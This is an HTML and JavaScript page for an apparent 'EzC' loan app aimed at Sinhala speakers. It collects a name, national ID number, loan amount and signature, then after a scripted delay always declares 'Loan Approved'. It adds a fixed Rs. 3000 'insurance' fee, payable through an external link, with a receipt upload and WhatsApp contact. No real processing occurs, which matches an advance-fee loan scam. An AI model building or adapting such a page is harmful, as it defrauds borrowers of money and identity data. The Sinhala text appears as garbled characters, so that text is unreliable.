<!DOCTYPE html>
<html lang="si">
<head>
<meta charset="UTF-8">

<meta name="viewport"
 content="width=device-width,
 initial-scale=1,
 maximum-scale=1,
 minimum-scale=1,
 user-scalable=no,
 viewport-fit=cover">

<title>EzC Signature App</title>

<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
html,body{
 margin:0;padding:0;width:100%;height:100%;
 overflow:hidden;font-family:system-ui;
 background:#eaeef3;
 touch-action:manipulation;
 overscroll-behavior:none;
}
.app{
 max-width:420px;height:100%;
 margin:auto;background:#fff;
 overflow-y:auto;
 -webkit-overflow-scrolling:touch;
}
.page{padding:16px;}
h3{text-align:center;}
label{display:block;margin-top:14px;font-weight:600;}
input{
 width:100%;padding:14px;margin-top:6px;
 border-radius:12px;border:1px solid #ccc;
 font-size:16px;
}
button{
 width:100%;padding:14px;margin-top:14px;
 border:none;border-radius:14px;
 font-size:16px;color:#fff;
}
.next-btn{background:#27ae60;}
.clear-btn{background:#e74c3c;}
.pay-btn{background:#2980b9;}
.whatsapp-btn{background:#25D366;}
.info-btn{background:#8e44ad;}

.statement{
 margin-top:12px;padding:12px;
 background:#f4f6f8;border-radius:12px;
 font-size:14px;
}

canvas{
 width:100%;height:160px;
 border:2px dashed #aaa;
 border-radius:12px;margin-top:8px;
 background:#fff;
 touch-action:none;
}

#page2{display:none;}

#loading{
 position:fixed;inset:0;
 background:rgba(255,255,255,.96);
 display:none;
 flex-direction:column;
 align-items:center;
 justify-content:center;
 z-index:999;
}

.spinner{
 width:48px;height:48px;
 border:5px solid #ddd;
 border-top:5px solid #27ae60;
 border-radius:50%;
 animation:spin 1s linear infinite;
 margin-bottom:16px;
}
@keyframes spin{100%{transform:rotate(360deg);}}

.progress-container{
 width:100%;height:18px;
 background:#eee;border-radius:9px;
 margin-top:20px;overflow:hidden;
 position:relative;
}
.progress-bar{
 width:0%;height:100%;
 background:#27ae60;
}
.progress-num{
 position:absolute;left:50%;
 transform:translateX(-50%);
 font-size:12px;font-weight:600;
}

/* üîî CUSTOM ALERT */
#alertBox{
 display:none;
 position:fixed;
 inset:0;
 background:rgba(0,0,0,.45);
 z-index:9999;
 align-items:center;
 justify-content:center;
}
#alertCard{
 background:#fff;
 padding:20px;
 border-radius:14px;
 max-width:300px;
 text-align:center;
}
#alertCard button{
 margin-top:14px;
 background:#27ae60;
}
</style>
</head>

<body>

<div class="app">

<!-- PAGE 1 -->
<div class="page" id="page1">
<h3>Customer Details</h3>

<label>Name</label>
<input id="name">

<label>NIC</label>
<input id="nic">

<label>Amount (Rs)</label>
<input type="number" id="amount">

<div class="statement">
‡∂∏‡∑è ‡∑Ä‡∑í‡∑É‡∑í‡∂±‡∑ä ‡∂Ω‡∂∂‡∑è ‡∂ú‡∂±‡∑ä‡∂±‡∑è ‡∂∏‡∑ô‡∂∏ ‡∂∏‡∑î‡∂Ø‡∂Ω ‡∂Ø‡∑ì ‡∂á‡∂≠‡∑í ‡∂ö‡∑è‡∂Ω ‡∑Ä‡∂ö‡∑Ä‡∑è‡∂±‡∑î‡∑Ä ‡∑Ä‡∂Ω‡∂ß ‡∂Ö‡∂±‡∑î‡∑Ä ‡∂ú‡∑ô‡∑Ä‡∑ì‡∂∏ ‡∂ö‡∂ª‡∂± ‡∂∂‡∑Ä ‡∂∏‡∑ô‡∂∫‡∑í‡∂±‡∑ä ‡∂¥‡∑ú‡∂ª‡∑ú‡∂±‡∑ä‡∂Ø‡∑î ‡∑Ä‡∑ô‡∂∏‡∑í.
</div>

<label>Signature</label>
<canvas id="sign"></canvas>
<button class="clear-btn" onclick="clearSign()">Clear Signature</button>
<button class="next-btn" onclick="goNext()">Next</button>

<div class="progress-container">
 <div class="progress-bar" id="progress1"></div>
 <div class="progress-num" id="progressNum1">0%</div>
</div>
</div>

<!-- PAGE 2 -->
<div class="page" id="page2">
<h3>Loan Approved</h3>

<p><b>Customer ID:</b> <span id="customerId"></span></p>
<p><b>Amount:</b> Rs. <span id="showAmount"></span></p>
<p><b>Insurance:</b> Rs. <span id="insurance"></span></p>

<label>Upload Receipt</label>
<input type="file" id="receiptUpload">

<button class="info-btn" onclick="openInsuranceInfo()">Insurance Payment ‡∑Ñ‡∑ö‡∂≠‡∑î‡∑Ä</button>
<button class="pay-btn" onclick="payNow()">Pay Now</button>
<button class="whatsapp-btn" onclick="sendWhatsApp()">WhatsApp ‡∂∏‡∂ú‡∑í‡∂±‡∑ä ‡∑Ä‡∑í‡∑É‡∑ä‡∂≠‡∂ª ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±</button>
<button class="next-btn" onclick="submitDetails()">Submit</button>

<div class="progress-container">
 <div class="progress-bar" id="progress2"></div>
 <div class="progress-num" id="progressNum2">0%</div>
</div>
</div>

</div>

<!-- LOADING -->
<div id="loading">
 <div class="spinner"></div>
 <div id="loadingText">Loading...</div>
</div>

<!-- CUSTOM ALERT -->
<div id="alertBox">
 <div id="alertCard">
  <div id="alertText"></div>
  <button onclick="closeAlert()">OK</button>
 </div>
</div>

<script>
const PAY_LINK="https://ezcservice.github.io/ezcservice-i/";
const INSURANCE_INFO_LINK="https://example.com/insurance-info";
const WHATSAPP_NO="94742089009";

/* CUSTOM ALERT */
function showAlert(msg){
 document.getElementById("alertText").innerText=msg;
 document.getElementById("alertBox").style.display="flex";
}
function closeAlert(){
 document.getElementById("alertBox").style.display="none";
}

/* SIGNATURE */
const c=document.getElementById("sign");
const ctx=c.getContext("2d");
let draw=false,hasSignature=false;

function resizeCanvas(){
 c.width=c.offsetWidth;
 c.height=160;
 ctx.lineWidth=2.5;
 ctx.lineCap="round";
}
resizeCanvas();

c.addEventListener("pointerdown",e=>{
 draw=true;hasSignature=true;
 ctx.beginPath();
 ctx.moveTo(e.offsetX,e.offsetY);
});
c.addEventListener("pointermove",e=>{
 if(!draw) return;
 ctx.lineTo(e.offsetX,e.offsetY);
 ctx.stroke();
});
c.addEventListener("pointerup",()=>draw=false);

function clearSign(){
 hasSignature=false;
 ctx.clearRect(0,0,c.width,c.height);
}

/* PROGRESS */
function setProgress(bar,num,val){
 document.getElementById(bar).style.width=val+"%";
 document.getElementById(num).innerText=val+"%";
}

/* NEXT */
function goNext(){
 if(!name.value||!nic.value||!amount.value){
  showAlert("‡∂ö‡∂ª‡∑î‡∂´‡∑è‡∂ö‡∂ª ‡∑É‡∑í‡∂∫‡∂Ω‡∑î fields ‡∂¥‡∑î‡∂ª‡∑Ä‡∂±‡∑ä‡∂±");
  return;
 }
 if(!hasSignature){
  showAlert("Signature ‡∂ë‡∂ö ‡∂Ø‡∑è‡∂±‡∑ä‡∂±");
  return;
 }

 setProgress("progress1","progressNum1",100);

 loading.style.display="flex";
 loadingText.innerText="Processing...";

 setTimeout(()=>{
  loading.style.display="none";
  page1.style.display="none";
  page2.style.display="block";

  customerId.innerText="EZ-"+Date.now();
  showAmount.innerText=amount.value;
  insurance.innerText=3000;

  setProgress("progress2","progressNum2",90);
 },4000);
}

/* SUBMIT */
function submitDetails(){
 if(!receiptUpload.files.length){
  showAlert("‡∂ö‡∂ª‡∑î‡∂´‡∑è‡∂ö‡∂ª ‡∂ª‡∑í‡∑É‡∑í‡∂ß‡∑ä ‡∂¥‡∂≠ upload ‡∂ö‡∂ª‡∂±‡∑ä‡∂±");
  return;
 }
 showAlert("Submission ‡∑É‡∑è‡∂ª‡∑ä‡∂Æ‡∂ö‡∂∫‡∑í ‚úîÔ∏è");
}

/* ACTIONS */
function payNow(){ window.open(PAY_LINK,"_blank"); }
function sendWhatsApp(){
 const msg=`Loan Details\nAmount: Rs.${showAmount.innerText}`;
 window.open(`https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`);
}
function openInsuranceInfo(){
 window.open(INSURANCE_INFO_LINK,"_blank");
}
</script>

</body>
</html>
